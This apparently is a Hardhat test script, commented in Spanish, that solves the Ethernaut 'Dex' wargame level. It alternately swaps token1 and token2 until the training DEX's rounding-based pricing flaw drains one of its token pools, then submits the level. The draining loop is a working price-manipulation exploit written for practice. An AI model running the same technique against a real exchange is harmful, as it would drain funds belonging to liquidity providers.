import { expect } from "chai";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { createChallenge, submitLevel } from "./utils";
import { Interface } from "ethers/lib/utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract;
let token1:string;
let token2:string;
let maximoASwappear:number;
let cambiarColumnas:boolean = false; // Solo para mostrar mejor el console log.
const LEVEL_ADDRESS = "0xC084FC117324D7C628dBC41F17CAcAaF4765f49e";
const INSTANCIA_DEL_NIVEL: string = "0x7026fB99FF790AAe5b1feE9f438889D76136dd0F";
// const INSTANCIA_DEL_NIVEL: string = "";

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  // Contrato del challenge
  const challengeFactory = await ethers.getContractFactory(`Dex`);
  if (INSTANCIA_DEL_NIVEL.length > 1) {
    challenge = challengeFactory.attach(INSTANCIA_DEL_NIVEL);
    console.log(`INSTANCIA CONTRATO CHALLENGE UTILIZADA DESDE:`, challenge.address);
  }
  else {
    const challengeAddress = await createChallenge(LEVEL_ADDRESS);
    challenge = challengeFactory.attach(challengeAddress);
    console.log(`CONTRATO CHALLENGE DEPLOYADO EN:`, challenge.address);
  }

  token1 = await challenge.token1();
  token2 = await challenge.token2();

  console.log(`TOKEN 1: ${token1}`);
  console.log(`TOKEN 2: ${token2}`);
  

  // Contrato atacante (Si fuera necesario)
  // const attackerFactory = await ethers.getContractFactory(`ShopAttacker`);
  // attacker = await attackerFactory.deploy(challenge.address);
  // await attacker.deployed();
  // console.log(`CONTRATO ATACANTE DEPLOYADO EN:`, attacker.address);
});

describe("Dex challenge", async()=> {
  it("Resuelve el challenge - Dex", async()=>{
    // Comprobamos estado inicial del dex y nuestra eoa
    let dexToken1Balance:number = await challenge.balanceOf(token1,challenge.address);
    let dexToken2Balance:number = await challenge.balanceOf(token2,challenge.address);
    console.log(`DEX BALANCE TOKEN 1: ${dexToken1Balance}`);
    console.log(`DEX BALANCE TOKEN 2: ${dexToken2Balance}`);

    let eoaToken1Balance:number = await challenge.balanceOf(token1,eoa.getAddress());
    let eoaToken2Balance:number = await challenge.balanceOf(token2,eoa.getAddress());
    console.log(`EOA BALANCE TOKEN 1: ${eoaToken1Balance}`);
    console.log(`EOA BALANCE TOKEN 2: ${eoaToken2Balance}`);

    // Primero habilito al DEX a que utilice mis 2 tokens. Para esto uso Dex.approve.
    let txApproveInicial = await challenge.approve(challenge.address, 9999);    
    await txApproveInicial.wait();
    
    maximoASwappear = eoaToken1Balance; // Al comenzar, tenemos misma cantidad de token1 que token2, por lo que es lo mismo tomar como máximo a cualquiera de las dos cantidades.

    while(dexToken1Balance * dexToken2Balance != 0){ // Uno de los dos tokens fue vaciado.
      console.log(`Comenzando SWAP. Valor a Swappear: ${maximoASwappear}`);
      try {
        let txSwap = await challenge.swap(token1,token2,maximoASwappear);
        await txSwap.wait();
      } catch (error:any) {
        if (error.toString().slice(93,133) == "'ERC20: transfer amount exceeds balance'") { //Localmente ocurrirá este error, pero es probable que al correr el test en rinkeby haya que omitirlo.
          console.log("HOLIS, CAMBIEMOS EL AMOUNT A SWAPPEAR...");
          // Actualizo maximoASwappear con el menor del balance en tokens del DEX (matemáticas viejo...)
          maximoASwappear = (dexToken2Balance <= dexToken1Balance) ? dexToken1Balance : dexToken2Balance;
          console.log(`AHORA EL AMOUNT A SWAPPEAR ES: ${maximoASwappear}`);
          // Con el maximoASwappear ajustado, procedemos a realizar el swap que dejará un token del dex con balance = 0.
          let txSwap = await challenge.swap(token1,token2,maximoASwappear);
          await txSwap.wait();
        }
      }
      
      // Actualizo stock de tokens para eoa y Dex.
      eoaToken1Balance = await challenge.balanceOf(token1,eoa.getAddress());
      eoaToken2Balance = await challenge.balanceOf(token2,eoa.getAddress());
      dexToken1Balance = await challenge.balanceOf(token1,challenge.address);
      dexToken2Balance = await challenge.balanceOf(token2,challenge.address);
      
      // Actualizo maximoASwappear con el mayor balance de mis tokens.
      maximoASwappear = (eoaToken1Balance >= eoaToken2Balance) ? eoaToken1Balance : eoaToken2Balance;
      
      
      if (!cambiarColumnas) {
        console.log(`----------------------------------------------------`);
        console.log(`EOA TOKEN1 | EOA TOKEN2 | DEX TOKEN 1 | DEX TOKEN 2 `);
        console.log(`-----------|------------|-------------|-------------`);
        console.log(`${eoaToken1Balance}             ${eoaToken2Balance}            ${dexToken1Balance}           ${dexToken2Balance}        `);
        console.log(`----------------------------------------------------`);
        console.log(`Próximo máximo a swappear: ${maximoASwappear}`);
      } else {
        console.log(`----------------------------------------------------`);
        console.log(`EOA TOKEN1 | EOA TOKEN2 | DEX TOKEN 1 | DEX TOKEN 2 `);
        console.log(`-----------|------------|-------------|-------------`);
        console.log(`${eoaToken2Balance}             ${eoaToken1Balance}            ${dexToken2Balance}           ${dexToken1Balance}        `);
        console.log(`----------------------------------------------------`);
        console.log(`Próximo máximo a swappear: ${maximoASwappear}`);
      }

      // Alterno los tokens, ya que nuestro token1 ahora estará vacío y el token2 lleno.
      let tokenAux = token1;
      token1 = token2;
      token2 = tokenAux;
      cambiarColumnas = !cambiarColumnas;
    }

    console.log("UNO DE LOS TOKENS DEL DEX FUE VACIADO... FELICITACIONES RUFIÁN!");
  })
});

after(async () => {
  expect(await submitLevel(challenge.address), "DESAFÍO INCOMPLETO").to.be.true;
});   